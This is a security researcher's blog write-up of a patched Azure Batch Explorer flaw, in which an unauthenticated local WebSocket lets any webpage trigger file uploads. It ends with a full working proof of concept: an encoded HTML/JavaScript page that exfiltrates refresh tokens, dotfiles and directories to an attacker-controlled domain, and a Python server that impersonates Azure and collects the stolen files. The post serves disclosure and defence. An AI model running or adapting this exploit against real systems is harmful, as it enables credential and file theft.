<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Azure Batch Explorer: Drive-By File and Token Leak via Local WebSocket</title>
  <style>
        pre {
    font-family: 'Courier New', Courier, monospace;
    white-space: pre;
  }
    body {
      background-color: #ffffcc;
      color: black;
      font-family: monospace;
      margin: 40px;
    }

    a {
      color: blue;
      }
    h2 { font-size: 1.2em; text-transform: lowercase; }
    hr { border: 1px dashed #999; }

    .blink {
      animation: blink 1s step-start infinite;
    }

    @keyframes blink {
      50% { opacity: 0; }
    }

    h1.rainbow {
      font-size: 32px;
      font-weight: bold;
      background: linear-gradient(90deg, red, orange, yellow, green, cyan, blue, violet);
      -webkit-background-clip: text;
      color: transparent;
      display: inline-block;
    }

.wave-letter {
  display: inline-block;
  animation: wave 1.5s infinite ease-in-out;
  font-weight: bold;
  font-size: 32px;
  background: linear-gradient(90deg, red, orange, yellow, green, cyan, blue, violet);
  background-clip: text;
  -webkit-background-clip: text;
  color: transparent;
  background-size: 800% 100%;
}

.g0  { background-position: 0% 50%; }
.g1  { background-position: 9% 50%; }
.g2  { background-position: 18% 50%; }
.g3  { background-position: 27% 50%; }
.g4  { background-position: 36% 50%; }
.g5  { background-position: 45% 50%; }
.g6  { background-position: 54% 50%; }
.g7  { background-position: 63% 50%; }
.g8  { background-position: 72% 50%; }
.g9  { background-position: 81% 50%; }
.g10 { background-position: 90% 50%; }
.g11 { background-position: 100% 50%; }

@keyframes wave {
  0%   { transform: translateY(0); }
  25%  { transform: translateY(-6px); }
  50%  { transform: translateY(0); }
  75%  { transform: translateY(6px); }
  100% { transform: translateY(0); }
}


    @keyframes wave {
      0%   { transform: translateY(0); }
      25%  { transform: translateY(-6px); }
      50%  { transform: translateY(0); }
      75%  { transform: translateY(6px); }
      100% { transform: translateY(0); }
    }

    .wave-letter:nth-child(1)  { animation-delay: 0s; }
    .wave-letter:nth-child(2)  { animation-delay: 0.1s; }
    .wave-letter:nth-child(3)  { animation-delay: 0.2s; }
    .wave-letter:nth-child(4)  { animation-delay: 0.3s; }
    .wave-letter:nth-child(5)  { animation-delay: 0.4s; }
    .wave-letter:nth-child(6)  { animation-delay: 0.5s; }
    .wave-letter:nth-child(7)  { animation-delay: 0.6s; }
    .wave-letter:nth-child(8)  { animation-delay: 0.7s; }
    .wave-letter:nth-child(9)  { animation-delay: 0.8s; }
    .wave-letter:nth-child(10) { animation-delay: 0.9s; }
    .wave-letter:nth-child(11) { animation-delay: 1.0s; }
    .wave-letter:nth-child(12) { animation-delay: 1.1s; }


    pre.code-green {
      background: #000;
      color: #0f0;
      padding: 1em;
      overflow-x: auto;
      font-family: "Source Code Pro", monospace;
      border-radius: 4px;
      margin: 1.5em 0;
    }
    pre.code-green code {
      color: inherit;
      background: none;
    }
    p span {
            display: block;
        }
  </style>
</head>

<body class="site">
  <header class="site-header">
    <div class="inner">
      <nav class="site-nav">
        <a href="https://blog.qwertysecurity.com/">Home</a>
        <a href="https://www.linkedin.com/in/felix-boulet/">LinkedIn</a>
      </nav>
    </div>
  </header>

  <main class="site-main inner">
    <article class="post">
      <header class="post-header">
        <h1 class="post-title">
          Azure Batch Explorer: Drive-By File and Token Leak via Local WebSocket (Patched)
        </h1>
        <p class="post-meta"><b>August 15, 2025 - Vulnerability Write-up</b></p>
      </header>
      <div class="post-content">

        <p>
  <span>When I realized there’d be no paycheck for this research, I figured I might as well earn some street cred instead. It started with a hunch: local developer tools can quietly widen your attack surface. Azure Batch Explorer, a desktop app from Microsoft for managing Azure Batch resources, was a case in point.</span>
  <span>Versions up to <strong>2.21.0.1069</strong> opened a WebSocket on 127.0.0.1 with no origin checks, CORS enforcement, or authentication. Any webpage you visited could talk straight to it.</span>
  <span>The fix is out now so let’s unpack what went wrong and why it matters.</span>
</p>
        <hr />

        <h2>What Was the Risk?</h2>
        <p>
          If you ran a vulnerable version of Batch Explorer and simply opened a malicious webpage,
          that page could:
        </p>
        <ul>
          <li>Connect to <code>ws://127.0.0.1:45032</code> and issue JSON-RPC calls</li>
          <li>Trigger privileged actions like uploading any local file or stealing Azure refresh tokens</li>
          <li>Do it all without a single prompt or click</li>
        </ul>
        <p>
          The app exposed a local control plane to the browser without validating who was talking to it.
        </p>

        <h2>What Could Be Stolen?</h2>
        <ul>
          <li>Any file the app could read: shell configs, credential stores, even your entire user folder</li>
          <li>Azure refresh tokens with scopes such as <code>offline_access</code>, <code>openid</code>,
            and <code>user_impersonation</code></li>
        </ul>
        <p>
          If those tokens belong to a high-privilege account, an attacker could go from a simple web page
          to full Azure privilege escalation.
        </p>

        <h2>How the PoC Worked</h2>
        <ol>
          <li>Attacker hosts a malicious HTTPS page and a fake “Azure” endpoint using a Python server.</li>
          <li>Victim opens Batch Explorer, which spins up a WebSocket on localhost:45032.</li>
          <li>Victim browses to the attacker’s page and the JS opens the WebSocket.</li>
          <li>JS sends a <code>create-file-group</code> JSON-RPC call pointing uploads at the attacker’s server.</li>
          <li>Files like <code>AppData/Local/Microsoft/Edge/User Data/Default/Sessions/tab*</code>
            get exfiltrated.</li>
        </ol>
        <p>
          Batch Explorer trusted any <code>armUrl</code> or <code>storageEndpoint</code> in the payload,
          even if it pointed outside Azure.
        </p>

        <h2>Why It Was Missed</h2>
        <p>
          This wasn’t a subtle race condition or side-channel trick. It boiled down to:
        </p>
        <ul>
          <li>A local WebSocket server with no origin validation</li>
          <li>No authentication or permission checks on JSON-RPC methods</li>
          <li>Unvalidated user supplied inputs, such as the URLs</li>
        </ul>
        <p>
          Even top-tier vendors can slip up on basic trust boundaries when they assume <code>localhost</code>
          equals safe.
        </p>

        <h2>On Bug Bounties and Scope</h2>
        <p>
          <span>Microsoft marked this out of scope because the app is open source. That’s technically correct, but they’re the sole maintainer and publisher, this isn’t a forgotten community fork or community maintained.</span>
          <span>After some back and forth with the team, the Azure bounty scope is now clearer about excluding first-party open source tools like the Azure CLI and PowerShell modules.</span>
          <span>Shame it was updated only after I’d submitted my report.</span>
          <span><a href="https://www.microsoft.com/en-us/msrc/bounty-microsoft-azure#:~:text=February%2012,%202025">https://www.microsoft.com/en-us/msrc/bounty-microsoft-azure#:~:text=February%2012,%202025</a></span>
        </p>

        <h2>Key Lessons</h2>
        <ul>
          <li>Enforce authentication and origin checks on every local RPC interface</li>
          <li>Treat all web inputs as untrusted data, even in a browser context</li>
          <li>Map your threat model to real-world usage and product lifecycles</li>
          <li>Ensure the vendor’s security priorities align with your usage, and revalidate assumptions regularly</li>
        </ul>

        <h2>Wrapping Up</h2>
        <p>
          <span>The patch rolled out quickly, which is a welcome win. Still, unauthenticated local control interfaces remain a serious risk.</span>
          <span>If your app exposes an API, even on localhost, require authentication as a non‑negotiable baseline.</span>
          <span>Too bad this did not earn a bounty. Drive-by attacks in 2025 are rare and impactful.</span>
        </p>
        <p>
          <span>Please remember, local doesn’t mean safe.</span>
        </p>


        <h2>Proof.mp4</h2>
          <p>

            <details>
              <summary style="cursor: pointer; font-weight: bold; color: blue; text-decoration: underline;">
                <a href=#videopoc>Click me for proof</a>
              </summary>
              <p id=videopoc >
              <br>
                <video style="width: 75%; height: auto;" muted autoplay controls>
                  <source src="/Proofs/blog1/proof.mp4" type="video/mp4">
                  Your browser does not support the video tag.
                </video>
              </p>
            </details>
          </p>

        <h2>PoC HTML</h2>
        <pre class="code-green"><code>&#x0a;&#x3c;html&#x3e;&#x0a;&#x3c;head&#x3e;&#x0a;&#x3c;script&#x3e;&#x0a;function batchExfil&#x28;fileOrFolder&#x2c;malServer&#x2c;recurse&#x29;&#x7b;&#x0a;try&#x7b;ws&#x2e;close&#x28;&#x29;&#x7d;catch&#x28;e&#x29;&#x7b;&#x7d;&#x0a;const ws &#x3d; new WebSocket&#x28;&#x27;ws&#x3a;&#x2f;&#x2f;1&#x3a;1&#x40;127&#x2e;0&#x2e;0&#x2e;1&#x3a;45032&#x2f;&#x27;&#x29;&#x0a;ws&#x2e;onopen &#x3d; &#x28;&#x29; &#x3d;&#x3e; &#x7b;&#x0a;  console&#x2e;log&#x28;&#x27;ws opened on browser&#x27;&#x29;&#x0a;  ws&#x2e;send&#x28;&#x60;&#x0a;          &#x7b;&#x22;jsonrpc&#x22;&#x3a;&#x22;2&#x2e;0&#x22;&#x2c;&#x0a;           &#x22;method&#x22;&#x3a;&#x22;create-file-group&#x22;&#x2c;&#x0a;           &#x22;params&#x22;&#x3a;&#x5b;&#x22;asdzwzw&#x22;&#x2c;&#x22;&#x24;&#x7b;fileOrFolder&#x7d;&#x22;&#x2c;&#x7b;&#x0a;                     &#x22;fullpath&#x22;&#x3a;true&#x2c; &#x22;prefix&#x22;&#x3a;false&#x2c; &#x22;flatten&#x22;&#x3a;false&#x2c;&#x22;recursive&#x22;&#x3a;&#x24;&#x7b;recurse&#x7d;&#x0a;                     &#x7d;&#x5d;&#x2c;&#x0a;            &#x22;id&#x22;&#x3a;0&#x2c;&#x0a;            &#x22;request&#x5f;id&#x22;&#x3a;0&#x2c;&#x0a;           &#x22;options&#x22;&#x3a;&#x7b;&#x0a;               &#x22;authentication&#x22;&#x3a;&#x7b;&#x0a;                   &#x22;batchToken&#x22;&#x3a;&#x22;a&#x2e;a&#x2e;azwzw&#x22;&#x2c;&#x0a;                   &#x22;armToken&#x22;&#x3a;&#x22;a&#x2e;a&#x2e;azwzw&#x22;&#x2c;&#x0a;                   &#x22;armUrl&#x22;&#x3a;&#x22;https&#x3a;&#x2f;&#x2f;&#x24;&#x7b;malServer&#x7d;&#x2f;&#x22;&#x2c;&#x0a;                   &#x22;storageEndpoint&#x22;&#x3a;&#x22;&#x40;&#x24;&#x7b;malServer&#x7d;&#x2f;storageendpoint&#x2f;&#x22;&#x2c;&#x0a;                   &#x22;account&#x22;&#x3a;&#x7b;&#x0a;            &#x22;id&#x22;&#x3a; &#x22;&#x2f;subscriptions&#x2f;00000000-0000-0000-0000-000000000000&#x2f;resourceGroups&#x2f;test-tmp2&#x2f;providers&#x2f;Microsoft&#x2e;Batch&#x2f;batchAccounts&#x2f;testaccountmsobb&#x22;&#x2c;&#x0a;            &#x22;name&#x22;&#x3a; &#x22;testaccountmsobb&#x22;&#x2c;&#x0a;            &#x22;type&#x22;&#x3a; &#x22;Microsoft&#x2e;Batch&#x2f;batchAccounts&#x22;&#x2c;&#x0a;            &#x22;location&#x22;&#x3a; &#x22;canadacentral&#x22;&#x2c;&#x0a;            &#x22;subscription&#x22;&#x3a;&#x7b;&#x22;subscriptionId&#x22;&#x3a;&#x22;00000000-0000-0000-0000-000000000000&#x22;&#x7d;&#x2c;&#x0a;            &#x22;properties&#x22;&#x3a; &#x7b;&#x0a;                           &#x0a;                &#x22;accountEndpoint&#x22;&#x3a; &#x22;testaccountmsobb&#x2e;canadacentral&#x2e;[REDACTED]&#x22;&#x2c;&#x0a;                &#x22;nodeManagementEndpoint&#x22;&#x3a; &#x22;76ccb063-54c8-4de3-aacb-304ccb86c7c3&#x2e;canadacentral&#x2e;service&#x2e;batch&#x2e;azure&#x2e;com&#x22;&#x2c;&#x0a;                &#x22;poolAllocationMode&#x22;&#x3a; &#x22;BatchService&#x22;&#x2c;&#x0a;                &#x22;publicNetworkAccess&#x22;&#x3a; &#x22;Enabled&#x22;&#x2c;&#x0a;                &#x22;networkProfile&#x22;&#x3a; &#x7b;&#x0a;                    &#x22;accountAccess&#x22;&#x3a; &#x7b;&#x0a;                        &#x22;defaultAction&#x22;&#x3a; &#x22;Allow&#x22;&#x0a;                    &#x7d;&#x0a;                &#x7d;&#x2c;&#x0a;                &#x22;encryption&#x22;&#x3a; &#x7b;&#x0a;                    &#x22;keySource&#x22;&#x3a; &#x22;Microsoft&#x2e;Batch&#x22;&#x0a;                &#x7d;&#x0a;            &#x7d;&#x2c;&#x0a;            &#x22;identity&#x22;&#x3a; &#x7b;&#x0a;                &#x22;type&#x22;&#x3a; &#x22;None&#x22;&#x0a;            &#x7d;&#x0a;        &#x7d;&#x0a;                       &#x7d;&#x0a;                       &#x7d;&#x0a;                       &#x7d;&#x0a;                       &#x60;&#x29;&#x0a;&#x7d;&#x0a;&#x0a;ws&#x2e;onmessage &#x3d; &#x28;message&#x29; &#x3d;&#x3e; &#x7b;&#x0a;  console&#x2e;log&#x28;&#x60;message received&#x60;&#x2c; message&#x2e;data&#x29;&#x0a;&#x7d;&#x0a;&#x7d;&#x0a;&#x3c;&#x2f;script&#x3e;&#x0a;&#x3c;head&#x3e;&#x0a;&#x3c;body&#x3e;&#x0a;&#x3c;h1&#x3e;Poc page for batch explorer vulnerability&#x3c;&#x2f;h1&#x3e;&#x0a;&#x3c;div&#x3e;&#x0a;Input your malicious domain hosting the python server ex&#x3a;&#x22;example&#x2e;loc&#x22;&#x0a;&#x3c;input id&#x3d;&#x22;maldomain&#x22; value&#x3d;&#x22;&#x22;&#x3e;&#x0a;&#x3c;&#x2f;div&#x3e;&#x0a;&#x0a;&#x3c;div&#x3e;&#x0a;&#x3c;h2&#x3e;Exfil the tab file which contains the refresh token that was used to connect to the app &#x3c;&#x2f;h2&#x3e;&#x0a;&#x3c;input id&#x3d;&#x22;refreshToken&#x22; size&#x3d;200 value&#x3d;&#x22;C&#x3a;&#x2f;Users&#x2f;&#x2a;&#x2f;AppData&#x2f;Local&#x2f;Microsoft&#x2f;Edge&#x2f;User Data&#x2f;Default&#x2f;Sessions&#x2f;tab&#x2a;&#x22; disabled&#x3e;&#x0a;&#x3c;br&#x3e;&#x3c;button onclick&#x3d;&#x22;if&#x28;maldomain&#x2e;value&#x2e;length&#x3c;3&#x29;&#x7b;maldomain&#x2e;value&#x3d;prompt&#x28;&#x27;input your domain hosting the malicious python server&#x27;&#x2c; &#x27;example&#x2e;loc&#x27;&#x29;&#x7d;&#x3b;batchExfil&#x28;refreshToken&#x2e;value&#x2c;maldomain&#x2e;value&#x2c;false&#x29;&#x22;&#x3e;escalate privileges by exfiltrating azure&#x2f;m365 refresh token&#x3c;&#x2f;button&#x3e;&#x0a;&#x0a;&#x3c;&#x2f;div&#x3e;&#x0a;&#x0a;&#x3c;div&#x3e;&#x0a;&#x3c;h2&#x3e;Exfil username and dot file such as &#x2e;gitconfig&#x3c;&#x2f;h2&#x3e;&#x0a;&#x3c;input id&#x3d;&#x22;exfilUsers&#x22; size&#x3d;200 value&#x3d;&#x22;C&#x3a;&#x2f;Users&#x2f;&#x2a;&#x2f;&#x2e;&#x2a;&#x22; disabled&#x3e;&#x0a;&#x3c;br&#x3e;&#x3c;button onclick&#x3d;&#x22;if&#x28;maldomain&#x2e;value&#x2e;length&#x3c;3&#x29;&#x7b;maldomain&#x2e;value&#x3d;prompt&#x28;&#x27;input your domain hosting the malicious python server&#x27;&#x2c; &#x27;example&#x2e;loc&#x27;&#x29;&#x7d;&#x3b;batchExfil&#x28;exfilUsers&#x2e;value&#x2c;maldomain&#x2e;value&#x2c;false&#x29;&#x22;&#x3e;exfiltrate users&#x3c;&#x2f;button&#x3e;&#x0a;&#x0a;&#x3c;&#x2f;div&#x3e;&#x0a;&#x0a;&#x3c;div&#x3e;&#x0a;&#x3c;h2&#x3e;Exfil from any directory recursively&#x3c;&#x2f;h2&#x3e;&#x0a;&#x3c;input id&#x3d;&#x22;exfilDir&#x22; size&#x3d;200 value&#x3d;&#x22;C&#x3a;&#x2f;ProgramData&#x2f;Microsoft&#x2f;Windows&#x2f;Start Menu&#x2f;Programs&#x2f;Accessories&#x22; &#x3e;&#x0a;&#x3c;br&#x3e;&#x3c;button onclick&#x3d;&#x22;if&#x28;maldomain&#x2e;value&#x2e;length&#x3c;3&#x29;&#x7b;maldomain&#x2e;value&#x3d;prompt&#x28;&#x27;input your domain hosting the malicious python server&#x27;&#x2c; &#x27;example&#x2e;loc&#x27;&#x29;&#x7d;&#x3b;batchExfil&#x28;exfilDir&#x2e;value&#x2c;maldomain&#x2e;value&#x2c;true&#x29;&#x22;&#x3e;exfiltrate a directory of your choice&#x3c;&#x2f;button&#x3e;&#x0a;&#x0a;&#x3c;&#x2f;div&#x3e;&#x0a;&#x0a;&#x3c;div&#x3e;&#x0a;&#x3c;h2&#x3e;Exfil a single file&#x3c;&#x2f;h2&#x3e;&#x0a;&#x3c;input id&#x3d;&#x22;singleFile&#x22; size&#x3d;200 value&#x3d;&#x22;c&#x3a;&#x2f;windows&#x2f;debug&#x2f;netsetup&#x2e;log&#x22; &#x3e;&#x0a;&#x3c;br&#x3e;&#x3c;button onclick&#x3d;&#x22;if&#x28;maldomain&#x2e;value&#x2e;length&#x3c;3&#x29;&#x7b;maldomain&#x2e;value&#x3d;prompt&#x28;&#x27;input your domain hosting the malicious python server&#x27;&#x2c; &#x27;example&#x2e;loc&#x27;&#x29;&#x7d;&#x3b;batchExfil&#x28;singleFile&#x2e;value&#x2c;maldomain&#x2e;value&#x2c;false&#x29;&#x22;&#x3e;exfiltrate a file of your choice&#x3c;&#x2f;button&#x3e;&#x0a;&#x0a;&#x3c;&#x2f;div&#x3e;&#x0a;&#x0a;&#x3c;&#x2f;body&#x3e;&#x0a;&#x0a;&#x3c;&#x2f;html&#x3e;
</code></pre>

        <h2>Python Server PoC</h2>
        <pre class="code-green"><code><xmp>from http.server import HTTPServer,SimpleHTTPRequestHandler
import http
import ssl
import logging
from http import HTTPStatus

PORT = 8443

class MyHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def handle_request(self):
        logging.error(self.headers)
        logging.error(self.request)
        """Unified handler for all HTTP methods."""
        print(self.path)
        self.protocol_version = "HTTP/1.1"
        if self.path.split("?")[0].endswith("batchAccounts") == True:
            self.send_response(http.HTTPStatus.OK)
            message = '''{
    "value": [
        {
            "id": "/subscriptions/00000000-0000-0000-0000-000000000000/resourceGroups/test-tmp2/providers/Microsoft.Batch/batchAccounts/testaccountmsobb",
            "name": "testaccountmsobb",
            "type": "Microsoft.Batch/batchAccounts",
            "location": "canadacentral",
            "properties": {
                "accountEndpoint": "testaccountmsobb.canadacentral.[REDACTED]",
                "nodeManagementEndpoint": "00000000-0000-0000-0000-000000000000.canadacentral.service.batch.azure.com",
                "provisioningState": "Succeeded",
                "dedicatedCoreQuota": 6,
                "dedicatedCoreQuotaPerVMFamily": [
                    {
                        "name": "standardAv2Family",
                        "coreQuota": 6
                    }
                ],
                "dedicatedCoreQuotaPerVMFamilyEnforced": true,
                "lowPriorityCoreQuota": 6,
                "poolQuota": 20,
                "activeJobAndJobScheduleQuota": 100,
                "autoStorage": {
"storageAccountId": "/subscriptions/00000000-0000-0000-0000-000000000000/resourceGroups/test-tmp2/providers/Microsoft.Storage/storageAccounts/zwzwzw",
                    "lastKeySync": "2024-11-25T18:57:18.3288351Z",
                    "authenticationMode": "BatchAccountManagedIdentity"
                },
                "poolAllocationMode": "BatchService",
                "publicNetworkAccess": "Enabled",
                "networkProfile": {
                    "accountAccess": {
                        "defaultAction": "Allow"
                    }
                },
                "privateEndpointConnections": [],
                "encryption": {
                    "keySource": "Microsoft.Batch"
                },
                "allowedAuthenticationModes": [
                    "AAD",
                    "TaskAuthenticationToken"
                ]
            },
            "identity": {
                "type": "None"
            }
        }
    ]
}'''
            self.send_header("Content-Type", "application/json")
        elif self.path.split("?")[0].endswith("listKeys") == True:
            message = '''{"keys":[{"keyName":"key1","value":"","permissions":"FULL"},{"keyName":"key2","value":"","permissions":"FULL"}]}
'''
            self.send_response(http.HTTPStatus.OK)
            self.send_header("Content-Type", "application/json")

        elif self.path.endswith("&restype=container") == True:
            message = '''<?xml version="1.0" encoding="utf-8"?><EnumerationResults ServiceEndpoint="https://batch.qwertysecurity.com/" ContainerName="test123"><MaxResults>30</MaxResults><Delimiter>/</Delimiter><Blobs /><NextMarker /></EnumerationResults>
'''
            self.send_response(http.HTTPStatus.OK)
            self.send_header("Content-Type", "text/xml")

        elif self.path.endswith("&comp=metadata") == True:
            self.send_response(http.HTTPStatus.OK)
            message = '''{"keys":[{"keyName":"key1","value":""}]}
'''
            self.send_header("Content-Type", "text/xml")

        elif self.path.startswith("/storageendpoint/") == True:
            message = '''Okay
'''
            self.send_response(http.HTTPStatus.CREATED)
            self.send_header("access-control-allow-origin", "*")
            self.send_header("access-control-expose-headers", "x-ms-request-id,x-ms-client-request-id,Server,x-ms-version,x-ms-content-crc64,Content-MD5,Last-Modified,ETag,x-ms-request-server-encrypted,Content-Length,Date,Transfer-Encoding")
            self.send_header("content-md5", "bWhXUMmjaSzZ/ykNM6jvMQ==")
            self.send_header("date", "Mon, 25 Nov 2024 20:47:10 GMT")
            self.send_header("etag", "0x8DD0D9255CFEF53")
            self.send_header("last-modified", "Mon, 20 Nov 2020 20:20:20 GMT")
            self.send_header("server", "Windows-Azure-Blob/1.0 Microsoft-HTTPAPI/2.0")
            self.send_header("x-ms-client-request-id", "4a99d12d-4fc4-487b-ab78-ca40a75f0013")
            self.send_header("x-ms-content-crc64", "YD3+dFyECL8=")
            self.send_header("x-ms-request-id", "00000000-0000-0000-0000-000000000000")
            self.send_header("x-ms-request-server-encrypted", "true")
            self.send_header("x-ms-version", "2022-11-02")
            self.send_header("Content-Type", "application/octet-stream")

        else:
            message = 'not found'
        # Send response headers
#        logging.error("Received query to path: \r\n" +self.path+ " Sending message: \r\n"+message)
        self.send_header("Content-Security-Policy","default-src 'self'")
        self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
        self.send_header("Pragma", "no-cache")
        self.send_header("Expires", "0")
#        self.send_header("Content-Length", str(len(message)))
        self.send_header("X-Ms-Request-Id", "24b77f2f-16bd-440b-ae35-e94effbf1e6a")
        self.send_header("Strict-Transport-Security", "max-age=31536000; includeSubDomains")
        self.send_header("X-Ms-Ratelimit-Remaining-Subscription-Resource-Requests", "11999")
        self.send_header("X-Ms-Correlation-Request-Id", "7e8169e0-4c2c-4665-a1bf-a6e3a52ce5af")
        self.send_header("X-Ms-Routing-Request-Id", "CANADAEAST:20241125T144212Z:7e8169e0-4c2c-4665-a1bf-a6e3a52ce5af")
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("X-Cache", "CONFIG_NOCACHE")
        self.send_header("X-Msedge-Ref", "Ref A: 45CA1FE5577C49F6B34D3EDFAD79E2E8 Ref B: YTO221090814035 Ref C: 2024-11-25T14:42:12Z")
        self.send_header("Date", "Mon, 25 Nov 2024 14:42:11 GMT")
        self.send_header("x-ms-error-code","BlobNotFound")
        self.end_headers()

        # Write the response body
        self.wfile.write(message.encode('utf-8'))

    # Override all HTTP method handlers to use handle_request
    def do_GET(self):
        self.handle_request()

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_body = self.rfile.read(content_length)
        print(f"Received POST body: {post_body.decode('utf-8')}")
        self.handle_request()

    def do_OPTIONS(self):
        self.handle_request()

    def do_PUT(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_body = b'Received PUT body: '+self.rfile.read(content_length)
        print('\r\n==========================================\r\n')
        print(post_body.decode('ISO-8859-1'))
        print('\r\n==========================================\r\n')
        self.handle_request()

    def do_DELETE(self):
        self.handle_request()

    def do_HEAD(self):
        self.handle_request()

    def do_PATCH(self):
        self.handle_request()


httpd = HTTPServer(('0.0.0.0', 443), MyHTTPRequestHandler)
# Since version 3.10: SSLContext without protocol argument is deprecated.
# sslctx = ssl.SSLContext()
sslctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
sslctx.check_hostname = False # If set to True, only the hostname that matches the certificate will be accepted
sslctx.load_cert_chain(certfile='certificate.crt', keyfile="private.key")
httpd.socket = sslctx.wrap_socket(httpd.socket, server_side=True)
httpd.serve_forever()
</xmp></code></pre>

      </div>
    </article>
  </main>
    <footer class="site-footer">
    <div class="inner">
      <nav class="site-nav">
        <a href="https://blog.qwertysecurity.com/">Home</a>
        <a href="https://www.linkedin.com/in/felix-boulet/">LinkedIn</a>
      </nav>
    </div>
  </footer>
</body>
</html>
